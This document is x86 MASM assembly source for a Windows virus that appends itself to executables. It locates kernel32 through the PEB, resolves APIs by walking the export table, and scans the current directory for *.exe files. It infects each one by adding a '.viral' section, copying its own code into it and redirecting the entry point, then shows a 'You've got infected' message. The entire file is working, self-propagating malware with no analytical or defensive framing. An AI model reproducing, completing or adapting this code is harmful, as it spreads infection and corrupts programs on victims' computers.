.386
.model flat,stdcall
option casemap:none
assume fs:nothing
include C:\masm32\include\windows.inc

.code
start:

viral_payload: 
    call Delta
Delta:
    pop ebp
    sub ebp, offset Delta 
SaveOEP:
    mov ebx, [oldEntryPoint + ebp]
    mov [saveEntryPoint + ebp], ebx
;get kernel32 base
    mov eax, [fs:30h]; PEB
    mov eax, [eax + 0ch] ; Ldr
    mov eax, [eax + 14h] ; InMemoryOrderModuleList
    mov eax, [eax]
    mov eax, [eax]
    mov eax, [eax -8h + 18h] ;Kernel32 Base
    
    mov [kernel32Base + ebp], eax ; save kernel32Base
    mov ebx, eax
;read kernel32.dll    
    ;NT header
    mov eax, [ebx + 3ch]; RVA of PE Sig
    add eax, ebx; VA = RVA + Base
    
    ;Export directory
    mov eax, [eax + 78h]; RVA of Export
    add eax, ebx; VA
    
    ;Number of Export Func
    mov ecx, [eax + 14h]; Number of EAT
    mov [numOfFunc + ebp], ecx; save
    
    ;Addr of Func
    mov ecx, [eax + 1ch]; RVA of EAT
    add ecx, ebx; VA
    mov [addOfFunc + ebp], ecx; save
    
    ;Addr of Name
    mov ecx, [eax + 20h]; RVA of ENT
    add ecx, ebx; VA
    mov [addOfName + ebp], ecx; save
    
    ;Addr of Ord
    mov ecx, [eax + 24h]; RVA of EOT
    add ecx, ebx; VA
    mov [addOfOrd + ebp], ecx; save
    
    xor eax, eax
    xor ecx, ecx
;find api GetProcAddress in kernel32.dll
findGetProcAddr:
    lea esi, [api_GetProcAddress + ebp]
    mov edi, [addOfName + ebp]
    cld
    mov edi, [edi + eax * 4]
    add edi, ebx
    mov ecx, [len_GetProcAddress + ebp]
    ;--------------------------------
    repe cmpsb
    jz founded
    inc eax
    cmp eax, [numOfFunc + ebp]
    jmp findGetProcAddr
founded:
    mov ecx, [addOfOrd + ebp]  
    mov edx, [addOfFunc + ebp]
    mov ax, [ecx + eax * 2]
    mov eax, [edx + eax * 4]
    add eax, ebx
    mov [AGetProcAddress + ebp], eax; save address of api GetProcAddress
;--------------------------------------------------
;load api
    ;get api LoadLibraryA
    lea ebx, [api_LoadLibraryA + ebp]
    push ebx
    push [kernel32Base + ebp]
    call eax
    mov [ALoadLibraryA + ebp], eax; save addr api LoadLibraryA
    ;call LoadLibraryA load user32.dll
    lea ecx, [dll_User32 + ebp]
    push ecx
    call eax
    ;get api MessageBoxA
    lea ebx, [api_MessageBoxA + ebp]
    push ebx
    push eax
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AMessageBoxA + ebp], eax; save addr api MessageBoxA
    ;get api strcpyA
    lea ebx, [api_lstrcpyA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AlstrcpyA + ebp], eax; save addr api strcpyA
    ;get api strcpyA
    lea ebx, [api_lstrcatA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AlstrcatA + ebp], eax; save addr api strcatA
    ;get api FindFirstFileA
    lea ebx, [api_FindFirstFileA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AFindFirstFileA + ebp], eax; save addr api FindFirstFileA
    ;get api FindNextFileA
    lea ebx, [api_FindNextFileA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AFindNextFileA + ebp], eax; save addr api FindNextFileA
    ;get api CreateFileA
    lea ebx, [api_CreateFileA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [ACreateFileA + ebp], eax; save addr api CreateFileA
    ;get api GetFileSize
    lea ebx, [api_GetFileSize + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AGetFileSize + ebp], eax; save addr api GetFileSize
    ;get api CreateFileMappingA
    lea ebx, [api_CreateFileMappingA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [ACreateFileMappingA + ebp], eax; save addr api CreateFileMappingA
    ;get api MapViewOfFile
    lea ebx, [api_MapViewOfFile + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AMapViewOfFile + ebp], eax; save addr api MapViewOfFile
    ;get api UnmapViewOfFile
    lea ebx, [api_UnmapViewOfFile + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AUnmapViewOfFile + ebp], eax; save addr api UnmapViewOfFile
    ;get api CloseHandle
    lea ebx, [api_CloseHandle + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [ACloseHandle + ebp], eax; save addr api CloseHandle
    ;get api GetCurrentDirectoryA
    lea ebx, [api_GetCurrentDirectoryA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AGetCurrentDirectoryA + ebp], eax; save addr api GetCurrentDirectoryA
    ;get api GetModuleHandleA
    lea ebx, [api_GetModuleHandleA + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AGetModuleHandleA + ebp], eax; save addr api GetModuleHandleA   
    ;get api ExitProcess
    lea ebx, [api_ExitProcess + ebp]
    push ebx
    push [kernel32Base + ebp]
    mov edx, [AGetProcAddress + ebp] 
    call edx
    mov [AExitProcess + ebp], eax; save addr api ExitProcess
    
findfirst:
    lea eax, [filePath + ebp]
    push eax
    push MAX_PATH
    call [AGetCurrentDirectoryA + ebp]
    
    lea eax, [filePath + ebp]
    lea ebx, [character + ebp]
    push ebx
    push eax
    call [AlstrcatA + ebp]
    
    lea eax, [filePathTemp + ebp]
    lea ebx, [filePath + ebp]
    push ebx
    push eax
    call [AlstrcpyA + ebp]
         
    lea eax, [filePathTemp + ebp]
    lea ebx, [infectFilter + ebp]
    push ebx
    push eax
    call [AlstrcatA + ebp]
   
    lea eax, [filePathTemp + ebp]
    lea ebx, [findData + ebp]
    push ebx
    push eax
    call [AFindFirstFileA + ebp]
    
    ;chek error
    cmp eax, INVALID_HANDLE_VALUE
    je error
    mov [findHandle + ebp], eax
    
targetfound:
    lea eax, [targetFile + ebp]
    lea ebx, [filePath + ebp]
    push ebx
    push eax
    call [AlstrcpyA + ebp]

    lea eax, [targetFile + ebp]
    lea ebx, [findData.cFileName + ebp]
    push ebx
    push eax
    call [AlstrcatA + ebp]
          
    cmp eax, 0h
    je error
    ; If there was no error, map the file.
    jmp mapfile
    
findnext:
    mov eax, [findHandle + ebp]
    lea ebx, [findData + ebp]
    push ebx
    push eax
    call [AFindNextFileA + ebp]
    ;invoke FindNextFileA, eax, ebx
    cmp eax, 0h
    je error   
    jmp targetfound


mapfile:
    ;open file
    lea eax, [targetFile + ebp]
    push 0
    push 80h
    push 3
    push 0
    push 0
    push 0C0000000h
    push eax
    call [ACreateFileA + ebp]
    ;invoke CreateFileA, eax, 0C0000000h, 0, 0, 3, 80h, 0
    
    cmp eax, INVALID_HANDLE_VALUE
    je findnext
    mov [targetFileHandle + ebp],eax
        
    ;get file size
    push 0
    push eax
    call [AGetFileSize + ebp]
    ;invoke GetFileSize,eax,0
    cmp eax, INVALID_HANDLE_VALUE
    je findnext
    mov [fileSize + ebp],eax
    
    ;Create File Mapping
    mov eax, [targetFileHandle + ebp]
    push 0
    push 0
    push 0
    push PAGE_READWRITE
    push 0
    push eax
    call [ACreateFileMappingA + ebp]
    ;invoke CreateFileMappingA, eax, 0, PAGE_READWRITE, 0, 0, 0
    cmp eax, 0h
    je findnext
    mov [targetMapHandle + ebp], eax
    
    ;Map View Of File
    push 0
    push 0
    push 0
    push FILE_MAP_WRITE
    push eax
    call [AMapViewOfFile + ebp]  
    ;invoke MapViewOfFile, eax, FILE_MAP_WRITE, 0, 0, 0
    cmp eax, 0h
    je findnext
    mov [targetP + ebp], eax
    
    ;load DOS header
    mov bx,[eax]    ;e_magic
    cmp bx, IMAGE_DOS_SIGNATURE
    jnz findnext

    ;load PE header
    add eax, [eax+3Ch]  ;e_lfanew

    ;Number of section
    mov cx, [eax+06h]   ;NumberOfSections
    movzx ecx, cx
    cmp ecx, 0h
    je findnext
    mov [numberOfSections + ebp], ecx
    
    ; AddressOfEntryPoint
    mov ecx, [eax+28h]   ; AddressOfEntryPoint
    mov [oldEntryPoint + ebp], ecx
    
    ;SectionAlignment
    xor ecx,ecx
    mov ecx,[eax+38h]   ;SectionAlignment
    mov [sectionAlignment + ebp], ecx
    
    ;FileAlignment
    xor ecx,ecx
    mov ecx, [eax+3Ch]  ;FileAlignment
    mov [fileAlignment + ebp], ecx
        
    ;load section table
    add eax, size IMAGE_NT_HEADERS
    
    ; Save the location of the first section header
    mov ecx, [numberOfSections + ebp]
    mov edx, size IMAGE_SECTION_HEADER
    imul ecx, edx
    
    ; Its an RVA from targetP so offset by eax
    mov edx, eax
    add ecx, edx
    
    ; Store the location of the last segment header
    mov [lastSegHeader + ebp], ecx
    
@@checkInfected:
    mov esi, [lastSegHeader + ebp]
    sub esi, 28h
    lea edi, [secName + ebp]
    mov ecx, lengthName - secName - 1
    repz cmpsb
    jz findnext
    
    ;Copy name of Section
    lea esi, [secName + ebp]
    mov edi, [lastSegHeader + ebp]
    mov ecx, lengthName - secName
    rep movsb
    ; Fix the VirtualSize
    mov eax, viral_payload_size
    mov ecx, [lastSegHeader + ebp]
    mov [ecx+08h], eax  ;VirtualSize
    
    ; Fix the virtual address
    mov ecx, [lastSegHeader + ebp]
    sub ecx, 28h
    mov eax, [ecx+08h]  ;VirtualSize
    mov ecx, [ecx+0Ch]  ;VirtualAddress
    add eax, ecx
    sub eax, 1
    xor edx, edx
    div [sectionAlignment + ebp]
    add eax, 1
    mul [sectionAlignment + ebp]
    mov ecx, [lastSegHeader + ebp]
    mov [ecx+0Ch], eax  ;VirtualAddress
        
    ; Fix the raw data size
    mov eax, viral_payload_size
    sub eax, 1
    xor edx, edx
    div [fileAlignment + ebp]
    add eax, 1
    mul [fileAlignment + ebp]
    mov ecx, [lastSegHeader + ebp]
    mov [ecx+10h], eax  ;SizeOfRawData
    mov [injectSize + ebp], eax
    
    ; Fix the raw data pointer
    mov ebx, [lastSegHeader + ebp]
    sub ebx, 28h
    mov eax, [ebx+14h]  ;PointerToRawData
    add eax, [ebx+10h]  ;SizeOfRawData
    mov ecx, [lastSegHeader + ebp]
    mov [ecx+14h], eax  ;PointerToRawData
    mov [injectStart + ebp], eax
    
    ;other filed
    xor edx,edx
    mov [ecx+18h], edx  ;PointerToRelocations
    mov [ecx+1Ch], edx  ;PointerToLinenumbers
    mov [ecx+20h], edx  ;NumberOfRelocations
    mov [ecx+22h], edx  ;NumberOfLinenumbers
   
    ; Fix the section flags
    mov edx, IMAGE_SCN_MEM_READ + \
             IMAGE_SCN_MEM_WRITE + \
             IMAGE_SCN_MEM_EXECUTE + \
             IMAGE_SCN_CNT_CODE
    mov ecx, [lastSegHeader + ebp]
    mov [ecx+24h], edx  ;Characteristics
    
    ; Fix numberOfSections
    mov ecx, [targetP + ebp]
    add ecx, [ecx+3Ch]  ;e_lfanew
    mov eax, [numberOfSections + ebp]
    inc eax
    mov [ecx+06h], ax   ;NumberOfSections
    
    ; Fix SizeOfImage
    mov eax, viral_payload_size
    sub eax, 1
    xor edx, edx
    div [sectionAlignment + ebp]
    add eax, 1
    mul [sectionAlignment + ebp]
    add eax, [ecx+50h]
    mov [ecx+50h], eax  ;SizeOfImage
    
    ; Fix AddressOfEntryPoint
    mov ebx, [lastSegHeader + ebp]
    mov eax, [ebx+0Ch]  ;new EntryPoint = lastSection->VirtualAddress
    mov [ecx+28h], eax  ;AddressOfEntryPoint
    
    ; Unmap the target
    mov eax, [targetP + ebp]
    push eax
    call [AUnmapViewOfFile + ebp]
    ;invoke UnmapViewOfFile, eax
    cmp eax, 0h
    je error
    
    ; Close the map handle
    mov eax, [targetMapHandle + ebp]
    push eax
    call [ACloseHandle + ebp]
    ;invoke CloseHandle, eax
    cmp eax, 0h
    je error
    
    mov eax, [fileSize + ebp]
    mov ecx, [injectSize + ebp]
    add eax, ecx
    mov ebx, [targetFileHandle + ebp]

    ; Memory map the target PE file again with this new size
    push 0
    push eax
    push 0
    push PAGE_READWRITE
    push 0
    push ebx
    call [ACreateFileMappingA + ebp]
    ;invoke CreateFileMappingA,ebx,0,PAGE_READWRITE,0,eax,0
    cmp eax, 0h
    je error
    ; Save a handle to the new memory map
    mov [targetMapHandle + ebp], eax
    
    ; Map a full view of the resized PE
    push 0
    push 0
    push 0
    push FILE_MAP_WRITE
    push eax
    call [AMapViewOfFile + ebp]
    ;invoke MapViewOfFile,eax,FILE_MAP_WRITE,0h,0h,0h
    cmp eax, 0h
    je error
    mov [targetP + ebp], eax   
    
    push eax
    mov edi, eax
    add edi, [injectStart + ebp]
    mov ecx, [injectSize + ebp]
    @@loopcopy:
      mov eax, 0h
      stosb
    loop @@loopcopy
    pop eax
        
    
@@startcopyviruscode:
    ; Destination: the start of our section in targetP
    mov edi, eax
    add edi, [injectStart + ebp]
    ; Source: the beginning of the virus code
    lea esi, [viral_payload + ebp]
    ; Number of bytes to copy: size of the injected section
    mov ecx, [injectSize + ebp]
    ; Copy the virus code into place   
@@copyviruscode:
    rep movsb
      
    ; Unmap the target
    mov eax, [targetP + ebp]
    push eax
    call [AUnmapViewOfFile + ebp]
    ;invoke UnmapViewOfFile, eax
    cmp eax, 0h
    je error
    
    ; Close the map handle
    mov eax, [targetMapHandle + ebp]
    push eax
    call [ACloseHandle + ebp]
    ;invoke CloseHandle, eax
    cmp eax, 0h
    je error
    
    ; Close the file handle
    mov eax, [targetFileHandle + ebp]
    push eax
    call [ACloseHandle + ebp]
    ;invoke CloseHandle, eax
    cmp eax, 0h
    je error
    
    @@finishedinfection:
    ; Move on to other file
    jmp findnext
  
error:
    cmp ebp, 0
    je @@gen0
@@notgen0:
    push MB_OK
    push 0
    lea eax, [messageContent + ebp]
    push eax
    push 0 
    call [AMessageBoxA + ebp]
    push 0
    call [AGetModuleHandleA + ebp]
    add eax, [saveEntryPoint + ebp]
    jmp eax
@@gen0:
    push 0
    call [AExitProcess + ebp]
_data:
    messageContent      db      "You've got infected",0
    filePathTemp        db      MAX_PATH dup(" ")
    findData            WIN32_FIND_DATA <0>
    infectFilter        db      "*.exe",0
    secName             db      ".viral",0
    lengthName:
    character           db      "\",0
    targetFile          db      MAX_PATH dup(" ")
    filePath            db      MAX_PATH dup(" ")
    findHandle          HANDLE  0    
    targetFileHandle    HANDLE  0
    fileSize            DD      0
    targetMapHandle     HANDLE  0
    targetP             DD      0
    numberOfSections    DD      0
    oldEntryPoint       DD      0
    saveEntryPoint      DD      0
    lastSegHeader       DD      0
    sectionAlignment    DD      0
    fileAlignment       DD      0
    injectStart         DD      0
    injectSize          DD      0
    
    kernel32Base        dd      0 
    numOfFunc           dd      0
    addOfFunc           dd      0  
    addOfName           dd      0
    addOfOrd            dd      0
;save name api        
    api_GetProcAddress  db      "GetProcAddress",0
    len_GetProcAddress  dd      $-api_GetProcAddress
    api_LoadLibraryA    db      "LoadLibraryA",0
    dll_User32          db      "User32.dll",0
    api_MessageBoxA     db      "MessageBoxA",0
    api_lstrcpyA        db      "lstrcpyA",0
    api_lstrcatA        db      "lstrcatA",0
    api_FindFirstFileA  db      "FindFirstFileA",0
    api_FindNextFileA   db      "FindNextFileA",0
    api_CreateFileA     db      "CreateFileA",0
    api_GetFileSize     db      "GetFileSize",0
    api_CreateFileMappingA db   "CreateFileMappingA",0
    api_MapViewOfFile   db      "MapViewOfFile",0
    api_UnmapViewOfFile db      "UnmapViewOfFile",0
    api_CloseHandle     db      "CloseHandle",0
    api_GetCurrentDirectoryA db "GetCurrentDirectoryA",0
    api_GetModuleHandleA db     "GetModuleHandleA",0
    api_ExitProcess     db      "ExitProcess",0
    
;variabel save addr api     
    AGetProcAddress     dd      0
    ALoadLibraryA       dd      0
    AMessageBoxA        dd      0
    AlstrcpyA           dd      0
    AlstrcatA           dd      0
    AFindFirstFileA     dd      0
    AFindNextFileA      dd      0
    ACreateFileA        dd      0
    AGetFileSize        dd      0
    ACreateFileMappingA dd      0
    AMapViewOfFile      dd      0
    AUnmapViewOfFile    dd      0
    ACloseHandle        dd      0
    AGetCurrentDirectoryA dd    0
    AGetModuleHandleA   dd      0
    AExitProcess        dd      0

    viral_payload_size  EQU     $ - viral_payload 
end_viral_payload:
end start